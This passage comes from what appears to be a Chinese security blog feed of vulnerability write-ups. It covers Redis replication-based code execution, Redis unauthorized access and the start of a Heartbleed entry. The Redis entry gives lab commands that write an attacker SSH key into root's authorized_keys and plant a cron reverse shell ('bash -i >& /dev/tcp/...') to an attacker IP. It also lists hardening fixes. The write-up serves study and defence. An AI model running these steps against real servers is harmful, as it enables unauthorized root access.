class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><h4 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h4><p>​        主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点（master），后者称为从节点（slave）；数据的复制是单向的，只能由主节点到从节点。</p><p>​        默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点（或没有从节点），但一个从节点只能有一个主节点。</p><p>​        主从复制的作用主要包括：</p><ul><li>数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。</li><li>故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。</li><li>负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。</li><li>高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。</li></ul><h5 id="如何使用主从复制"><a href="#如何使用主从复制" class="headerlink" title="如何使用主从复制"></a>如何使用主从复制</h5><ol><li>建立复制</li></ol><p>需要注意，<strong>主从复制的开启，完全是在从节点发起的；不需要我们在主节点做任何事情。</strong></p><p>从节点开启主从复制，有3种方式：</p><p>（1）配置文件</p><p>在从服务器的配置文件中加入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br></pre></td></tr></table></figure><p>（2）启动命令</p><p>redis-server启动命令后加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server --slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br></pre></td></tr></table></figure><p>（3）客户端命令</p><p>Redis服务器启动后，直接通过redis-cli客户端执行命令，则该Redis实例成为从节点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br></pre></td></tr></table></figure><p>以上3种方式是等效的，下面以客户端命令的方式为例，看一下当执行了slaveof后，Redis主节点和从节点的变化。</p><ol start="2"><li>实例</li></ol><p>通过以上3种方式的任意一种，建立主从关系，实例中10.251.0.33为主节点（master），10.251.0.36为从节点（slave）</p><p>下面验证一下，在主从复制建立后，主节点的数据会复制到从节点中。</p><p>（1）首先在从节点，查询一个不存在的key：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/17.png"></p><p>（2）然后在主节点中增加这个key：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/18.png"></p><p>（3）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/19.png"></p><p>（4）然后在主节点删除这个key：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/21.png"></p><p>（5）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/22.png"></p><ol start="3"><li>断开复制</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br></pre></td></tr></table></figure><p>命令建立主从复制关系以后，可以通过命令断开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof no one</span><br></pre></td></tr></table></figure><p>需要注意的是，从节点断开复制后，不会删除已有的数据，只是不再接受主节点新的数据变化。</p><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><p>攻击者连接到远程无密码或者弱密码的redis-server，执行slaveof命令，使redis服务器成为攻击者的slave机器，然后攻击者在本地编译一个恶意.so文件，利用外部模块扩展Redis功能这个特性，再配合主从复制机制传送到目标机器，之后注入远程命令调用.so，执行恶意操作。</p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>此漏洞利用的是redis的特性</p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>​        攻击包为RESP协议，Redis默认监听在6379，使用Redis命令，Redis命令详解请看 3.1技术背景。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/23.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://redis.io/commands/slaveof">https://redis.io/commands/slaveof</a></li><li><a href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></li><li><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="漏洞相关" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Redis未授权访问漏洞</title>
    <link href="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T07:57:13.000Z</published>
    <updated>2021-07-06T08:01:29.317Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis未授权访问漏洞</li><li>漏洞编号：CNVD-2015-07557</li><li>漏洞类型：未授权访问</li><li>CVSS评分：【CVSS v2.0：】【CVSS v3.0：】</li><li>漏洞危害等级：高危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis存在非授权访问漏洞，Redis服务默认对外开放6379端口，任意匿名用户可以连接登录。</p><p>​        Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>1、Redis配置了空密码或者弱密码</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1.png"></p><p>2、Redis配置文件中bind绑定0.0.0.0 127.0.0.1或者被注释</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/2.png"></p><p>3、Redis解除保护模式，可以在配置文件将protected-mode，设置为no</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected-mode no</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3.png"></p><p>或者，启动redis-server后，在redis-cli中输入命令，临时关闭保护模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET protected-mode no</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/4.png"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Redis未授权访问获取敏感信息"><a href="#Redis未授权访问获取敏感信息" class="headerlink" title="Redis未授权访问获取敏感信息"></a>Redis未授权访问获取敏感信息</h4><p>　　redis在开放往外网的情况下，默认配置下是空口令，端口为6379，连接后可以获取Redis敏感数据。</p><p>​        kali攻击机输入以下命令，获取靶机的敏感信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.251.0.36</span><br><span class="line">info</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/5.png"></p><h4 id="写入ssh公钥，获取操作系统权限"><a href="#写入ssh公钥，获取操作系统权限" class="headerlink" title="写入ssh公钥，获取操作系统权限"></a>写入ssh公钥，获取操作系统权限</h4><p>​        原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，可以在服务器端的/root/.ssh下生一个授权的key。</p><ul><li>首先在攻击机上生成key：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/6.png"></p><p>​        生成的公钥key</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/7.png"></p><ul><li>将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合）,再把key.txt文件内容写入目标主机的缓冲里：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.ssh/key.txt | ./redis-cli -h 192.168.10.153 -x set xxx</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/9.png"></p><ul><li>连接目标主机的Redis，设置redis的公钥key备份路径为/root/.ssh和保存文件名authorized_keys，将key.txt数据保存在服务器上：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/10.png"></p><ul><li>用攻击机ssh远程连接靶机，不用密码就可以直接远程登录ssh：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh 10.251.0.35</span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/12.png"></p><ul><li>可以在靶机，进入/root/.ssh目录，看一下authorized_keys的文件内容</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/11.png"></p><h4 id="利用计划任务执行命令反弹shell"><a href="#利用计划任务执行命令反弹shell" class="headerlink" title="利用计划任务执行命令反弹shell"></a>利用计划任务执行命令反弹shell</h4><p>先在攻击机上监听一个端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 666</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/13.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# redis-cli -h 10.251.0.36</span><br><span class="line">10.251.0.35:6379&gt; set exp &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/10.251.0.33/666 0&gt;&amp;1\n&quot;</span><br><span class="line">OK</span><br><span class="line">10.251.0.35:6379&gt; config set dir /var/spool/cron/</span><br><span class="line">OK</span><br><span class="line">10.251.0.35:6379&gt; config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">10.251.0.35:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/14.png"></p><p>靶机的/var/spool/cron路径下，有root文件</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/15.png"></p><p>多次尝试后，等一段时间，反弹shell成功：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/16.png"></p><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p><p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure><p>​        有关Redis命令的完整列表，请参考 <a href="http://redis.io/commands">http://redis.io/commands</a></p><p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p><ul><li><p>简单字符串以“ +”字符开头</p></li><li><p>错误以“-”字符开头</p></li><li><p>整数以“：”字符开头</p></li><li><p>批量字符串以“ $”字符开头</p></li><li><p>数组以“ *”字符开头</p><p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure><p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p><p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>​        Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><strong>1.禁止一些高危命令（重启redis才能生效）</strong></p><ul><li>修改 redis.conf 文件，禁用远程修改 DB 文件地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br></pre></td></tr></table></figure><ul><li>或者通过修改redis.conf文件，改变这些高危命令的名称</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;name1&quot;</span><br><span class="line">rename-command CONFIG &quot;name2&quot;</span><br><span class="line">rename-command EVAL &quot;name3&quot;</span><br></pre></td></tr></table></figure><p><strong>2. 以低权限运行 Redis 服务（重启redis才能生效）</strong></p><p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure><p><strong>3. 为 Redis 添加密码验证（重启redis才能生效）</strong></p><p>修改 redis.conf 文件，添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure><p>（注意redis不要用-a参数，明文输入密码，连接后使用auth认证）</p><p><strong>4. 禁止外网访问 Redis（重启redis才能生效）</strong></p><p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure><p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p><p><strong>5. 修改默认端口</strong></p><p>修改配置文件redis.conf文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port 6379</span><br></pre></td></tr></table></figure><p>默认端口是6379，可以改变成其他端口（不要冲突就好）</p><p><strong>6. 保证 authorized_keys 文件的安全</strong></p><p>为了保证安全，您应该阻止其他用户添加新的公钥。</p><ul><li>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><ul><li>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +i ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><ul><li>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 权限：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +i ~/.ssh</span><br></pre></td></tr></table></figure><p><strong>7. 设置防火墙策略</strong>　　</p><p>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://www.freebuf.com/column/158065.html">https://www.freebuf.com/column/158065.html</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="漏洞相关" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2014-0160_OpenSSL心脏滴血漏洞</title>
    <link href="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0160-OpenSSL%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0160-OpenSSL%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T06:59:47.000Z</published>
    <updated>2021-07-06T07:04:48.398Z</updated>
    
    <content type="html"><![CDATA[<p>​        OpenSSL是为网络通信提供安全及数据完整性的一种安全协议，囊括了主要的密码算法、常用的密钥和证书封装管理功能以及SSL协议。OpenSSL 1.0.1中的TLS和DTLS在实现上没有严格处理Heartbeat扩展包，心跳处理逻辑没有检测心跳包中的长度字段是否和后续的数据字段相符合，用此漏洞攻击者可以通过特制的数据包触发缓冲区溢出读操作，获得通信中的敏感信息。允许攻击者从内存中读取多达64KB的数据。</p><h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>​        OpenSSL心脏滴血（CVE-2014-0160），存在于含有心跳扩展机制的TLS版本：TLSv1.0（0x0301），TLSv1.1（0x0302），TLSv1.2（0x0303）三种版本中。</p><p>​        此漏洞主要通过攻击者模拟向服务器端发送自己编写的Heartbeat心跳数据包，主要是Heartbeat Message的长度与payload length进行匹配，若payload lenght长度大于HeartbeatMes sage的length，则会在服务器返回的response响应包中产生数据溢出，造成有用数据泄露。</p><p>TLS数据包格式</p><table><thead><tr><th>心跳包字段</th><th>长度</th><th>说明</th></tr></thead><tbody><tr><td>ContentType</td><td>1byte</td><td>心跳包类型，IANA组织把type编号定义为24（0x18）</td></tr><tr><td>ProtocolVersion</td><td>2bytes</td><td>TLS的版本号，目前主要包括含有心跳扩展的TLS版本：TLSv1.0，TLSv1.1，TLSv1.2</td></tr><tr><td>length</td><td>2bytes</td><td>HeartbeatMessage的长度</td></tr><tr><td>HeartbeatMessageType</td><td>1byte</td><td>Heartbeat类型 01表示heartbeat_request 